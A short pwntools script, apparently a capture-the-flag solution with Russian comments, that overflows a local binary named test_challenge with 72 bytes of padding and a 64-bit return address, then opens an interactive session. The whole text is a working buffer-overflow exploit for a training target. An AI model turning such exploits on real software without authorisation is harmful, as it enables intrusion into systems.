from pwn import *

offset = 72
target_address = 0x401186  # Наш найденный адрес
payload = b"A" * offset + p64(target_address)

# Запускаем бинарник
p = process("./test_challenge")
p.sendline(payload)
p.interactive()
